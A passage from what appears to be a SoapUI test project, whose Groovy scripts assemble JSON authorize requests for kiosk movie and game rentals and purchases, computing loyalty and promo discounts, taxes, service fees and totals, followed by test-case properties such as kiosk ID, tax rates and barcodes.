			rentalPayload += "\"PriceSetId\" : 0,"
	          rentalPayload += "\"Purchase\" : 0,"
			//Added a part of ProductPricing for BI; harcoded for the time being.
			rentalPayload += "\"ProductPriceId\" : 0,"
			rentalPayload += "\"InitialDays\" : 1,"
			rentalPayload += "\"DefaultInitialNight\" : $dvdPrice,"
			rentalPayload += "\"DefaultExtraNight\" : $dvdPrice"
			
		    //Calculate Rental Total
			rentalTotal += (dvdPrice.toBigDecimal());
			rentalDiscPrice.add(dvdPrice);
			rentalNonReturnPrice.add(dvdNonreturnPrice);
			rentalNonReturnDays.add(dvdNonReturnDays);
			redemptionPoints.add('1500');
	        }
	        else if (curformatID == '2') //For Bluray
	        {
			rentalPayload += "\"InitialNight\" : $blurayPrice,"
			rentalPayload += "\"ExtraNight\" : $blurayPrice,"
			rentalPayload += "\"NonReturn\" : $blurayNonreturnPrice,"
			rentalPayload += "\"Expiration\" : $blurayPrice,"
			rentalPayload += "\"NonReturnDays\" : $blurayNonReturnDays,"
			rentalPayload += "\"PriceSetId\" : 1,"
	          rentalPayload += "\"Purchase\" : 0,"
			//Added a part of ProductPricing for BI; harcoded for the time being.
			rentalPayload += "\"ProductPriceId\" : 0,"
			rentalPayload += "\"InitialDays\" : 1,"
			rentalPayload += "\"DefaultInitialNight\" : $blurayPrice,"
			rentalPayload += "\"DefaultExtraNight\" : $blurayPrice"
			
			//Calculate Rental Total
			rentalTotal += (blurayPrice.toBigDecimal());
			rentalDiscPrice.add(blurayPrice);
			rentalNonReturnPrice.add(blurayNonreturnPrice); 
			rentalNonReturnDays.add(blurayNonReturnDays);
			redemptionPoints.add('1750')
	        }
	        else //For Games
	        {
			rentalPayload += "\"InitialNight\" : $gamePrice,"
			rentalPayload += "\"ExtraNight\" : $gamePrice,"
			rentalPayload += "\"NonReturn\" : $gameNonreturnPrice,"
			rentalPayload += "\"Expiration\" : $gamePrice,"
			rentalPayload += "\"NonReturnDays\" : $gameNonReturnDays,"
			rentalPayload += "\"PriceSetId\" : 1,"
	          rentalPayload += "\"Purchase\" : 0,"
			//Added a part of ProductPricing for BI; harcoded for the time being.
			rentalPayload += "\"ProductPriceId\" : 0,"
			rentalPayload += "\"InitialDays\" : 1,"
			rentalPayload += "\"DefaultInitialNight\" : $gamePrice,"
			rentalPayload += "\"DefaultExtraNight\" : $gamePrice"
			
			//Calculate Rental Total
			rentalTotal += (gamePrice.toBigDecimal());
			rentalDiscPrice.add(gamePrice);
			rentalNonReturnPrice.add(gameNonreturnPrice);
			rentalNonReturnDays.add(gameNonReturnDays);
			redemptionPoints.add('2500');
	        }
	        //rentalPayload += ",\"SourceType\" : 1"  --NEEDED ONLY FOR RECO (RESVAUTH AND MODRESVPICKUP
			
			
			rentalPayload += "}," 
			rentalPayload += "\"BlurayUpsell\" : null,"
			rentalPayload += "\"ItemSourceType\" : 3"
			rentalPayload += "}" 
			 
			//Prepare it as List.
			rentalTitleIds.add(curTitleID);
			rentalBarcodes.add(curBarcodeID);
			allBarcodes.add(curBarcodeID);
			allTitleIds.add(curTitleID);
			testRunner.testCase.setPropertyValue("BarcodeForTnx",curBarcodeID.toString()); 
			rentalProductFamily.add(formatTypeName);
			rentalProductType.add(FormatName);
			rentalCount += 1;
			
			if (b+1 < numOfBarcodes.toInteger())
			{
			  rentalPayload += ","
			} 
		
	    }	    
	    if (f+1 < rentalformatIDList.size())
	    {
	        rentalPayload += ","
	    }  
	    //testRunner.testCase.setPropertyValue("rentalPayload",rentalPayload);
	    getDisctc.setPropertyValue('ExcludeRentalTitles', rentalTitleIds.join(",").toString());
    	    testRunner.testCase.setPropertyValue('RentalTitleIds', rentalTitleIds.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalBarcodes', rentalBarcodes.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalProductFamily', rentalProductFamily.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalProductType', rentalProductType.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalCount', rentalCount.toString());
	    testRunner.testCase.setPropertyValue('RentalDiscPrice', rentalDiscPrice.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalNonReturnPrice', rentalNonReturnPrice.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalNonReturnDays', rentalNonReturnDays.join(",").toString());
	    testRunner.testCase.setPropertyValue('RedemptionPoints', redemptionPoints.join(",").toString());
	    	    
	}
	log.info ("rentalTitleIds: $rentalTitleIds; rentalDiscPrice:$rentalDiscPrice; redemptionPoints:$redemptionPoints");
	testRunner.testCase.setPropertyValue("DiscountTitleIds",rentalTitleIds.join(",").toString())
	testRunner.testCase.setPropertyValue("DiscountProductPrices",rentalDiscPrice.join(",").toString())

//Build loyalty payload.
	if (loyaltyFlag == "")
	{
		testRunner.testCase.setPropertyValue("NonLoyaltyProductId",rentalTitleIds.join(",").toString());
		testRunner.testCase.setPropertyValue("NonLoyaltyProductPrice",rentalDiscPrice.join(",").toString());
		testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","0");
	}
	else
	{
		loyaltyTitleList = rentalTitleIds.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
		loyaltyTitlePrice = rentalDiscPrice.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
		for (l = 0; l < numberOfLoyaltyFlags; l++)
		{
		    	def DiscountTitleIds = Eval.me("[" + context.expand( '${#TestCase#DiscountTitleIds}' ) + "]");
		    	def DiscountProductPrices = Eval.me("[" + context.expand( '${#TestCase#DiscountProductPrices}' ) + "]");
		    	def redemptionPointsList = Eval.me("[" + context.expand( '${#TestCase#RedemptionPoints}' ) + "]");
		    	curLoyaltyFlag = loyaltyFlagList[l].toString().trim();
		    	curLoyaltyTitle = DiscountTitleIds.take(1).toString().replace("[", "").replace("]", "");
			curLoyaltyPrice = DiscountProductPrices.take(1).toString().replace("[", "").replace("]", "");
			curredemptionPoints = redemptionPointsList.take(1).toString().replace("[", "").replace("]", "");
		    	log.info ("curLoyaltyFlag:$curLoyaltyFlag; curLoyaltyTitle:$curLoyaltyTitle; curLoyaltyPrice:$curLoyaltyPrice; curredemptionPoints:$curredemptionPoints");
		    	if (curLoyaltyFlag == '1')
		    	{
		    	testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","1");
		    	loyaltyPayload += "{"; 
			loyaltyPayload += "\"ProductId\": $curLoyaltyTitle,";
			loyaltyPayload += "\"DiscountType\": \"Loyalty\",";
			loyaltyPayload += "\"PromotionCode\": null,";
			//promoPayload += "\"PromotionIntentCode\": \"$ProductId\",";
			loyaltyPayload += "\"RedemptionPoints\": $curredemptionPoints,";
			loyaltyPayload += "\"Amount\": $curLoyaltyPrice";
			loyaltyPayload += "}"; 
			//Calculate Loyalty Total
			EstimatedLoyaltyAmount += (curLoyaltyPrice.toBigDecimal());
			loyaltyProductId.add(curLoyaltyTitle);
		    	loyaltyProductPrice.add(curLoyaltyPrice);
		    	loyaltyPoints.add(curredemptionPoints);
		    	//For Assertions grabbing all the Discounted Titles and Prices.
		    	discountedProductId.add(curLoyaltyTitle);
		    	discountedProductPrice.add(curLoyaltyPrice);
		    	}
		    	else if (curLoyaltyFlag == "0")
		    	{
		    		//testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","0");
		    		nonLoyaltyProductId.add(curLoyaltyTitle);
		    		nonLoyaltyProductPrice.add(curLoyaltyPrice);
		    		//log.info ("Flag is 0");
		    	}
		    	//remainingTitles = DiscountTitleIds.drop(1).toString().replace("[", "").replace("]", "");
		    	testRunner.testCase.setPropertyValue("DiscountTitleIds",DiscountTitleIds.drop(1).toString().replace("[", "").replace("]", ""))
		    	testRunner.testCase.setPropertyValue("DiscountProductPrices",DiscountProductPrices.drop(1).toString().replace("[", "").replace("]", ""));
		    	testRunner.testCase.setPropertyValue("RedemptionPoints",redemptionPointsList.drop(1).toString().replace("[", "").replace("]", ""))		    	
		    	if (l+1 < numberOfLoyaltyFlags)
		      {
		      		if (curLoyaltyFlag == '1')
		      		{
		      			loyaltyPayload += ","
		      		}
		      		else
		      		{
		      			//None as of Now
		      			
		      		}
		      		     	
		      }
		      log.info ("loyaltyPayload: $loyaltyPayload");
		} 
		testRunner.testCase.setPropertyValue("LoyaltyProductPrice",loyaltyProductPrice.join(",").toString());
		testRunner.testCase.setPropertyValue("LoyaltyProductId",loyaltyProductId.join(",").toString());
		testRunner.testCase.setPropertyValue("NonLoyaltyProductId",nonLoyaltyProductId.join(",").toString());
		testRunner.testCase.setPropertyValue("NonLoyaltyProductPrice",nonLoyaltyProductPrice.join(",").toString());
	}
//Build Promo Payload
	if ((PromoCode == "" || PromoCode == "null" || PromoCode == null))
	{
		testRunner.testCase.setPropertyValue("HasPromoDiscount","0");//NO Promo
	}
	else
	{
		testRunner.testCase.setPropertyValue("HasPromoDiscount","1");
		def getNonLoyaltyProductId = context.expand( '${#TestCase#DiscountTitleIds}' );
		def getNonLoyaltyProductPrice = context.expand( '${#TestCase#DiscountProductPrices}' );
		log.info ("getNonLoyaltyProductId:$getNonLoyaltyProductId; getNonLoyaltyProductPrice:$getNonLoyaltyProductPrice");
		getNonLoyaltyProductIdList = getNonLoyaltyProductId.split(",");
		getNonLoyaltyProductPriceList = getNonLoyaltyProductPrice.split(",");
		
		promoCodeValue = Round16.format(discountvalue).toBigDecimal();
		//Set Remaining Promo value same as Promo Value
		testRunner.testCase.setPropertyValue("RemainingPromoValue",promoCodeValue.toString());

		//For Loop to build Promo Payload
		for (d = 0; d < getNonLoyaltyProductIdList.size(); d++)
		{
			//Get Remaining promo value
			remainingPromoValue = context.expand( '${#TestCase#RemainingPromoValue}' ).toBigDecimal();
			if (remainingPromoValue > 0)
			{
				curPromoTitleID = getNonLoyaltyProductIdList[d].toString().trim();
				curPromoTitlePrice = getNonLoyaltyProductPriceList[d].toString().trim();
				BigDecimal curPromoAmount = 0; //For assertions.
				promoPayload += "{";
				promoPayload += "\"ProductId\": $curPromoTitleID,";
				promoPayload += "\"DiscountType\": \"PromotionCode\",";
				promoPayload += "\"PromotionCode\": \"$PromoCode\",";
				promoPayload += "\"PromotionCodeValue\": \"$discountvalue\",";
		
				BigDecimal currentPromoValue = remainingPromoValue - (curPromoTitlePrice.toBigDecimal());
		
				if (remainingPromoValue >= curPromoTitlePrice.toBigDecimal())
				{
					promoPayload += "\"Amount\": $curPromoTitlePrice";
					curPromoAmount = curPromoTitlePrice.toBigDecimal();
					remaingPromoValue = (remainingPromoValue.toBigDecimal() -  curPromoTitlePrice.toBigDecimal());
					//Set Remaining Promo value after above calculation
					testRunner.testCase.setPropertyValue("RemainingPromoValue",remaingPromoValue.toString());
		
				}
				else if (remainingPromoValue < curPromoTitlePrice.toBigDecimal())
				{
					promoPayload += "\"Amount\": $remainingPromoValue";
					curPromoAmount = remainingPromoValue.toBigDecimal();
					//Set Remaining Promo value as 0.00
					testRunner.testCase.setPropertyValue("RemainingPromoValue","0.00");
				}
				else
				{
					log.info ("No PromoValue Remaining");
				}
				
				promoPayload += "}";				
			    	//For Assertions grabbing all the Discounted Titles and Prices.
			    	discountedProductId.add(curPromoTitleID);
			    	discountedProductPrice.add(curPromoAmount);	
			}
			//Get Remaining promo value
			remainingPromoValue = context.expand( '${#TestCase#RemainingPromoValue}' ).toBigDecimal();
			//Continue to for loop if number of titles available and have Remaining promo value > 0
			if ((d+1 < getNonLoyaltyProductIdList.size()) && remainingPromoValue > 0)
			        {
			            promoPayload += ",";
			        } 
		}
		//log.info ("PromoPayload: $promoPayload");
	}
	log.info ("promoPayload:$promoPayload");
	testRunner.testCase.setPropertyValue("EstimatedLoyaltyAmount", EstimatedLoyaltyAmount.toString());
	//Rounding the rental Total
	rentalTotal = Round16.format(rentalTotal).toBigDecimal();
	SubTotal += rentalTotal;
	log.info ("EstimatedLoyaltyAmount:$EstimatedLoyaltyAmount; discountvalue:$discountvalue");
	discountvalue = Round16.format(discountvalue).toBigDecimal();
	log.info ("Rentals Total: $rentalTotal; Promo Amount: $discountvalue");
	BigDecimal discountedSubTotal
	discountedSubTotal = ((rentalTotal).toBigDecimal()) - ((EstimatedLoyaltyAmount).toBigDecimal());
	log.info ("discountedSubTotal:$discountedSubTotal");
	//if (rentalTotal <= discountvalue)	{ discountedSubTotal = 0 }
	if (discountedSubTotal <= discountvalue)	{ discountedSubTotal = 0 }
	//else { discountedSubTotal = ((rentalTotal).toBigDecimal()) - ((discountvalue).toBigDecimal()) }
	else { discountedSubTotal = ((discountedSubTotal).toBigDecimal()) - ((discountvalue).toBigDecimal()) }
	
	// Rounding Discounted SubTotal 
	discountedSubTotal = Round16.format(discountedSubTotal).toBigDecimal();
	BigDecimal renttaxRate = ((context.expand( '${#TestCase#RentalTaxRate}').toBigDecimal()) / 100)
	BigDecimal rentalTaxAmt = (Round16.format(discountedSubTotal).toBigDecimal()) * ((renttaxRate).toBigDecimal());
	//rentalTaxAmt = Round16.format(rentalTaxAmt).toBigDecimal();
	rentalTaxAmt = Round16.format(rentalTaxAmt).toBigDecimal();
	DiscountedSubTotal += discountedSubTotal;
	TotalCartAmount += discountedSubTotal; //To get total amount
	BigDecimal grandTotal = discountedSubTotal + rentalTaxAmt;
	// trying to solve some rounding issues
	//grandTotal = Round16.format(grandTotal).toBigDecimal();
	grandTotal = Round16.format(grandTotal).toBigDecimal();
	log.info ("Rentals Discounted Total:$discountedSubTotal; Rentals Tax Amount:$rentalTaxAmt; Rentals Grand Total:$grandTotal");
	// add totals to the strings
	rentalPayload += "]," 
	rentalPayload += "\"Totals\" : { "
	rentalPayload += "\"TaxRate\" : " + context.expand( '${#TestCase#RentalTaxRate}') + ","
	rentalPayload += "\"Subtotal\" : $rentalTotal ,"
	rentalPayload += "\"DiscountedSubtotal\" : $discountedSubTotal,"
	rentalPayload += "\"TaxAmount\" : $rentalTaxAmt,"
	rentalPayload += "\"GrandTotal\" : $grandTotal} }";
	
	testRunner.testCase.setPropertyValue("rentalPayload",rentalPayload);
	testRunner.testCase.setPropertyValue("RentalTaxAmount", rentalTaxAmt.toString());
	rentalTotal = grandTotal; //Defining it to calculate Total Amount
}
//log.info ("###################################################");
log.info ("discountedProductId:$discountedProductId; discountedProductPrice:$discountedProductPrice");
//log.info ("###################################################");
//Purchase payload
if ((purchaseFormatIds == '0') || (purchaseFormatIds == '') || (rentalFormatIds == 'null'))
{
	log.info ("No Purchases in the transaction");
	testRunner.testCase.setPropertyValue('PurchaseCount', purchaseCount.toString());
	testRunner.testCase.setPropertyValue("PurchaseTaxAmount", '0');
}
else
{
	for (r = 0; r < purchaseformatIDList.size(); r++)
	{
	    curPurchaseFormatID = purchaseformatIDList[r].toString().trim();
	    log.info ("PurchaseFormatID: $curPurchaseFormatID");
	    def getFormatName = sql.firstRow("select FormatName AS OID from Format where FormatID = $curPurchaseFormatID");
	    def purchaseFormatName = (getFormatName.OID);
	    getDisctc.setPropertyValue('FormatID', curPurchaseFormatID);
	    getDisctc.setPropertyValue('FormatName', purchaseFormatName);  
	    getDisctc.setPropertyValue('KioskID',KioskId);  	    
	    //Run the test case: GetRecoDiscs
	    def runGetDiscs = getDisctc.run( null, false );
	        
	    // show that it worked out ok
	    log.info("Status: $runGetDiscs.status, time taken for TestCase : [Get Discs] For $purchaseFormatName was: $runGetDiscs.timeTaken ms");
	        
	    // assert that it didn't fail
	    assert runGetDiscs.status != Status.FAILED : runGetDiscs.reason
	}
	for (f = 0; f < purchaseformatIDList.size(); f++)
	{
	    curformatID = purchaseformatIDList[f].toString().trim();
	    def getFormatName = sql.firstRow("select FormatName, FormatTypeID from Format where FormatID = $curformatID");
	    def FormatName = (getFormatName.FormatName);
	    def formatTypeID = (getFormatName.FormatTypeID.toString());
	    
	    //Get FormatTypeName from FormatIypeID
	    def excuteFormatType = sql.firstRow("Select FormatTypeName from FormatType Where FormatTypeID = $formatTypeID");
	    def formatTypeName = (excuteFormatType.FormatTypeName.toString());
	    
	    def getBarcode = getDisctc.getPropertyValue("$FormatName-Barcodes");
	    def getTitleIDs = getDisctc.getPropertyValue("$FormatName-Titles");    
	    log.info ("getBarcode-$FormatName: $getBarcode");
	    getBarcodeList = getBarcode.split(",")
	    getTitleList = getTitleIDs.split(",")
	
	    numOfPurchaseBarcodes = numAddPurchasesList[f].toString().trim()
	    log.info ("numOfPurchaseBarcodes: $numOfPurchaseBarcodes; FormatName: $FormatName");
	
	    for (b = 0; b < numOfPurchaseBarcodes.toInteger(); b++)
	    {
		curBarcodeID = getBarcodeList[b].toString().trim();
		curTitleID = getTitleList[b].toString().trim();
		purchasePayload += "{"
		purchasePayload += "\"ProductId\" : $curTitleID,"
		purchasePayload += "\"Barcode\" : \"$curBarcodeID\","
		purchasePayload += "\"VendStatus\" : 28," //To-DO
		purchasePayload += "\"ProductFamily\" : \"$formatTypeName\","
		purchasePayload += "\"ProductType\" : \"$FormatName\","
		purchasePayload += "\"MultiDisc\" : false,"
		purchasePayload += "\"Pricing\" : {"
	        if (curformatID == '17') //DigitalCode Json
	        {
	            purchasePayload += "\"InitialNight\" : 0,"
	            purchasePayload += "\"ExtraNight\" : 0,"
	            purchasePayload += "\"NonReturn\" : 0,"
	            purchasePayload += "\"Purchase\" : $digitalCodePrice,"
	            purchasePayload += "\"Expiration\" : 0,"
	            purchasePayload += "\"NonReturnDays\" : 0,"
	            //Added a part of ProductPricing for BI; harcoded for the time being.
	            purchasePayload += "\"PriceSetId\" : 0,"
	            purchasePayload += "\"ProductPriceId\" : 0,"
	            purchasePayload += "\"InitialDays\" : null,"
	            purchasePayload += "\"DefaultInitialNight\" : null,"
	            purchasePayload += "\"DefaultExtraNight\" : null"
		  
	            //Calculate Rental Total
	            digitalTotal += (digitalCodePrice.toBigDecimal());
	            purchaseDiscPrice.add(digitalCodePrice);
	        }
	        else  //Regular Purchase of DVD, Bluray, or Game
	        {
	            purchasePayload += "\"InitialNight\" : 0,"
	            purchasePayload += "\"ExtraNight\" : 0,"
	            purchasePayload += "\"NonReturn\" : 0,"
	            purchasePayload += "\"Purchase\" : $purchasePrice,"
	            purchasePayload += "\"Expiration\" : 0,"
	            purchasePayload += "\"NonReturnDays\" : 0,"
	            //Added a part of ProductPricing for BI; harcoded for the time being.
	            purchasePayload += "\"PriceSetId\" : 0,"
	            purchasePayload += "\"ProductPriceId\" : 0,"
	            purchasePayload += "\"InitialDays\" : null,"
	            purchasePayload += "\"DefaultInitialNight\" : null,"
	            purchasePayload += "\"DefaultExtraNight\" : null"
	
	            //Calculate Rental Total
	            purchaseTotal += (purchasePrice.toBigDecimal());
	            purchaseDiscPrice.add(purchasePrice);
	            HasPhysicalPurchase = 'true';
	            testRunner.testCase.setPropertyValue("HasPhysicalPurchase",HasPhysicalPurchase);
	        }
	        
	        //purchasePayload += ",\"SourceType\" : 1" --NEEDED ONLY FOR RECO (RESVAUTH AND MODRESVPICKUP
		purchasePayload += "}"    
		purchasePayload += "}" 
		//Combine the list
		purchaseTitleIds.add(curTitleID);
		purchaseBarcodes.add(curBarcodeID);
		allBarcodes.add(curBarcodeID);
		allTitleIds.add(curTitleID);
		purchaseProductFamily.add(formatTypeName);
		purchaseProductType.add(FormatName);
		testRunner.testCase.setPropertyValue("BarcodeForTnx",curBarcodeID.toString());
	        //Count num of purchase.
	        purchaseCount += 1;
	        if (b+1 < numOfPurchaseBarcodes.toInteger())
	        {
	            purchasePayload += ","
	        } 
	    }
	    if (f+1 < purchaseformatIDList.size())
	    {
	        purchasePayload += ","
	    }
	    getDisctc.setPropertyValue('ExcludeRentalTitles', purchaseTitleIds.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseTitleIds', purchaseTitleIds.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseBarcodes', purchaseBarcodes.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseProductFamily', purchaseProductFamily.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseProductType', purchaseProductType.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseCount', purchaseCount.toString());
	    testRunner.testCase.setPropertyValue('PurchaseDiscPrice', purchaseDiscPrice.join(",").toString());
	}
	
	//Purchase Calculation	
	BigDecimal totalPurchaseTotal = (purchaseTotal.toBigDecimal() + digitalTotal.toBigDecimal())
	log.info ("totalPurchaseTotal: $totalPurchaseTotal");
	DiscountedSubTotal += totalPurchaseTotal;
	SubTotal += totalPurchaseTotal;
	def purchasetaxRate = context.expand( '${#TestCase#PurchaseTaxRate}');
	def digitalpurchasetaxRate = context.expand( '${#TestCase#DigitalPurchaseTaxRate}');
	if (digitalpurchasetaxRate == null || digitalpurchasetaxRate == "null" || digitalpurchasetaxRate == "") //If digitalpurchasetaxrate is null than use Purchase tax rate.
	{
		BigDecimal digitaltaxRate = ((purchasetaxRate.toBigDecimal()) / 100);
		BigDecimal digitalpurchaseTaxAmt = (Round16.format(digitalTotal).toBigDecimal()) * ((digitaltaxRate).toBigDecimal());
		digitalpurchaseTaxAmt = Round16.format(digitalpurchaseTaxAmt).toBigDecimal();
		testRunner.testCase.setPropertyValue("digitalpurchaseTaxAmt", digitalpurchaseTaxAmt.toString());
	}
	else //if digitalpurchasetaxrate is not null than use that ever is provided.
	{
		BigDecimal digitaltaxRate = ((digitalpurchasetaxRate.toBigDecimal()) / 100);
		BigDecimal digitalpurchaseTaxAmt = (Round16.format(digitalTotal).toBigDecimal()) * ((digitaltaxRate).toBigDecimal());
		digitalpurchaseTaxAmt = Round16.format(digitalpurchaseTaxAmt).toBigDecimal();
		testRunner.testCase.setPropertyValue("digitalpurchaseTaxAmt", digitalpurchaseTaxAmt.toString());
	}
	def totaldigitalpurchasetaxAmount = context.expand( '${#TestCase#digitalpurchaseTaxAmt}');
		
	BigDecimal purchaseTaxAmt = (Round16.format(purchaseTotal).toBigDecimal()) * ((purchasetaxRate).toBigDecimal()/100);
	purchaseTaxAmt = Round16.format(purchaseTaxAmt).toBigDecimal();
	
	log.info ("Digital Purchase Tax Amount: $totaldigitalpurchasetaxAmount; Purchase Tax Amount: $purchaseTaxAmt");
	def totalTaxAmount = (totaldigitalpurchasetaxAmount.toBigDecimal() + purchaseTaxAmt.toBigDecimal());
	BigDecimal purchaseGrandTotal = (totalPurchaseTotal + totalTaxAmount).toBigDecimal();
	log.info("Purchase Grand Total: $purchaseGrandTotal; Total Tax Amount: $totalTaxAmount");
	TotalCartAmount += totalPurchaseTotal; //To get total amount
	// add totals to the strings
	purchasePayload += "],"
	purchasePayload += "\"Totals\" : { ";
	if (HasPhysicalPurchase == 'true')
	{
		purchasePayload += "\"TaxRate\" : " + context.expand('${#TestCase#purchasetaxrate}') + ", ";
	}
	else
	{
		purchasePayload += "\"TaxRate\" : " + context.expand('${#TestCase#DigitalPurchaseTaxRate}') + ", ";
	}
	purchasePayload += "\"Subtotal\" : $totalPurchaseTotal,";
	purchasePayload += "\"DiscountedSubtotal\" : $totalPurchaseTotal,";
	//purchasePayload += "\"TaxAmount\" : \"" + totalTaxAmount + "\",";
	purchasePayload += "\"TaxAmount\" : $totalTaxAmount,";
	purchasePayload += "\"GrandTotal\" : $purchaseGrandTotal } }";
	
	testRunner.testCase.setPropertyValue("purchasePayload",purchasePayload);
	testRunner.testCase.setPropertyValue("PurchaseTaxAmount", totalTaxAmount.toString());
	purchaseTotal = purchaseGrandTotal;//Defining it to calculate Total Amount
}
testRunner.testCase.setPropertyValue('AllBarcodes', allBarcodes.join(",").toString());
testRunner.testCase.setPropertyValue('AllTitleIds', allTitleIds.join(",").toString());

TransactionTotal = (rentalTotal + purchaseTotal).setScale(2, BigDecimal.ROUND_HALF_UP);
//log.info ("TransactionTotal: $TransactionTotal");
testRunner.testCase.setPropertyValue("TransactionTotal",TransactionTotal.toString());
testRunner.testCase.setPropertyValue("DiscountedSubTotal",DiscountedSubTotal.toString());
testRunner.testCase.setPropertyValue("SubTotal",SubTotal.toString());

def HasLoyaltyDiscount = context.expand( '${#TestCase#HasLoyaltyDiscount}');
def HasPromoDiscount = context.expand( '${#TestCase#HasPromoDiscount}');
def discountPayload = "";

if (HasLoyaltyDiscount == '1' && HasPromoDiscount == '0')
{
	discountPayload = loyaltyPayload;
	log.info ("Has Loyalty Only");
}
else if (HasLoyaltyDiscount == '0' && HasPromoDiscount == '1')
{
	discountPayload = promoPayload;
	log.info ("Has Promo Only");
}
else if (HasLoyaltyDiscount == '1' && HasPromoDiscount == '1')
{
	discountPayload = "$loyaltyPayload,$promoPayload";
	log.info ("Has Loyalty and Promo");
}
else
{
	discountPayload = ""
	log.info ("No Promo and Loyalty");
}
log.info ("discountPayload:$discountPayload");
testRunner.testCase.setPropertyValue("DiscountPayload", discountPayload);
if (enableServiceFee == 'true')
{		
	serviceFeePayload += ",\"ServiceFee\": {";
	serviceFeePayload += "\"DefaultAmount\": \"$serviceFeeAmount\",";
	serviceFeePayload += "\"TaxRate\": $serviceFeeTaxRate,";
	if (TotalCartAmount > 0)
	{
		serviceFeePayload += "\"ActualAmount\": \"$serviceFeeAmount\",";
		BigDecimal serviceFeeTaxAmt = ((serviceFeeAmount).toBigDecimal()) * ((serviceFeeTaxRate).toBigDecimal()/100);
		serviceFeeTaxAmt = Round16.format(serviceFeeTaxAmt).toBigDecimal();
		serviceFeePayload += "\"TaxAmount\": \"$serviceFeeTaxAmt\" }";
	}
	else
	{
		serviceFeePayload += "\"ActualAmount\": \"0.00\",";
		serviceFeePayload += "\"TaxAmount\": \"0.00\" }";
	}
}
else
{
	log.info ("NO ServiceFee enabled");
}
testRunner.testCase.setPropertyValue("ServiceFeePayload",serviceFeePayload);

//RECO Payload



//Get Info needed 
def MessageId = UUID.randomUUID().toString();

def UseCredits = context.expand( '${#TestCase#UseCredits}');
calendar = Calendar.getInstance();
def theDate = (621355968000000000 +calendar.getTimeInMillis()*10000).toString();
def dateString = (new Date().format("yyyy-MM-dd'T'HH:mm:ss.SSSSSSS"));

//Build Authorize Request
requestPayload += "{";
requestPayload += "\"MessageType\": \"Authorize\",";
requestPayload += "\"MessageId\": \"$MessageId\",";
requestPayload += "\"EngineVersion\": \"1.27.1.297\",";
requestPayload += "\"BundleVersion\": \"2.27.1.65\",";
requestPayload += "\"KioskId\": $KioskId,";
if (CustomerProfileNumber == "")
{
	//No CP for the credit card
	requestPayload += "\"CustomerProfileNumber\": null,";
}
else
{
	requestPayload += "\"CustomerProfileNumber\": \"$CustomerProfileNumber\",";
}
requestPayload += "$ccPayload";
requestPayload += "\"TransactionDate\": {";
requestPayload += "\"theDate\": $theDate,";
requestPayload += "\"dateTimeKind\": \"Unspecified\",";
requestPayload += "\"dateString\": \"$dateString\"";
requestPayload += "},";
//requestPayload += "\"UseCredits\": \"OptedOut\",";
requestPayload += "\"UseCredits\": \"OptedIn\",";
requestPayload += "\"PropertyBag\": { },";
requestPayload += "\"ShoppingCart\": { ";
requestPayload += "\"Groups\": [  ";
if (rentalCount > 0 && purchaseCount == 0) {
	requestPayload += "$rentalPayload";
} else if (rentalCount == 0 && purchaseCount > 0) {
	requestPayload += "$purchasePayload";
} else if (rentalCount > 0 && purchaseCount > 0) {
	requestPayload += "$rentalPayload,$purchasePayload";
} else {
	log.info("No rental or purchase information generated!");
}
requestPayload += "],";
requestPayload += "\"Discounts\": [$discountPayload]";
requestPayload += "$serviceFeePayload";
requestPayload += "}} ";

// log to soapui log
log.info("Authorize Request: $requestPayload");

// url encode json string
result = "payload=" + URLEncoder.encode(requestPayload)
testRunner.testCase.setPropertyValue("RequestBody",result);
def IsOffline = context.expand( '${#TestCase#IsOffline}');
if (IsOffline == 'true')
{
	log.info ("No Authorize, skip to Reconcile");
	testRunner.gotoStepByName("Auth Completed");
}
else
{
	//Run Auth
}


//NEW Code

]]></script></con:config></con:testStep><con:setupScript>import groovy.sql.Sql
log.info("Loading SQL Driver for Auth");
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
log.info("End loading SQL Driver for Auth");</con:setupScript><con:tearDownScript><![CDATA[//if results file global property is populated,  
//record the testcase name with id
//add mingle card link if mingle property is set

def file = new File(context.expand( '${ResultsFile}' ))
if (context.expand( '${ResultsFile}' ) != null && file.exists()) {
file.append(testRunner.testCase.name + "</td><td><a href=\"http://mingle:8080/projects/server_platform/cards/" + 
context.expand('${#TestCase#Mingle}') + "\">" +context.expand('${#TestCase#Mingle}') +
"</a></td><td>" + context.expand('${#TestCase#Id}') + '\r\n')
} 
]]></con:tearDownScript><con:properties><con:property><con:name>Email</con:name><con:value>redbox.rentalserver@gmail.com</con:value></con:property><con:property><con:name>KioskID</con:name><con:value>1505</con:value></con:property><con:property><con:name>UseCredits</con:name><con:value>0</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.7500</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.0000</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>ReferenceNumber</con:name><con:value>5648740</con:value></con:property><con:property><con:name>recoFormats</con:name><con:value>1</con:value></con:property><con:property><con:name>numOfRecos</con:name><con:value>1</con:value></con:property><con:property><con:name>ModifiedCart</con:name><con:value>true</con:value></con:property><con:property><con:name>PurchaseCount</con:name><con:value>0</con:value></con:property><con:property><con:name>PurchaseBarcodes</con:name><con:value/></con:property><con:property><con:name>PurchaseTitleIds</con:name><con:value/></con:property><con:property><con:name>PurchaseProductFamily</con:name><con:value/></con:property><con:property><con:name>PurchaseProductType</con:name><con:value/></con:property><con:property><con:name>PurchaseDiscPrice</con:name><con:value/></con:property><con:property><con:name>RentalCount</con:name><con:value>4</con:value></con:property><con:property><con:name>RentalBarcodes</con:name><con:value>000150505,000150501,000027376,001505072</con:value></con:property><con:property><con:name>RentalTitleIds</con:name><con:value>1494